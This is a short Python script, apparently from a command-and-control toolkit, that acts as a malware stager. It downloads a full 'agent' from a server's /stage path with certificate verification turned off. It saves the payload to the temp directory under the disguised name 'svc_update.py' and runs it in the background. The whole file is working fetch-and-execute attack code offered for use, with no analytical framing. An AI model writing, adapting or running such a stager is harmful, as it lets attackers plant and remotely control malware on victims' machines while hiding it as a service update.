#!/usr/bin/env python3
"""Small stager — downloads full agent from /stage and runs it. Pure stdlib."""
import os
import subprocess
import sys
import tempfile
import urllib.request
import ssl

SERVER = sys.argv[1] if len(sys.argv) > 1 else "https://127.0.0.1:8443"
AGENT_ARGS = sys.argv[2:]

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

url = SERVER.rstrip("/") + "/stage"
try:
    with urllib.request.urlopen(url, context=ctx, timeout=30) as r:
        code = r.read()
except Exception as e:
    print(f"[!] stage download failed: {e}")
    sys.exit(1)

path = os.path.join(tempfile.gettempdir(), "svc_update.py")
with open(path, "wb") as f:
    f.write(code)

print(f"[*] staged to {path}, launching...")
subprocess.Popen([sys.executable, path] + AGENT_ARGS)
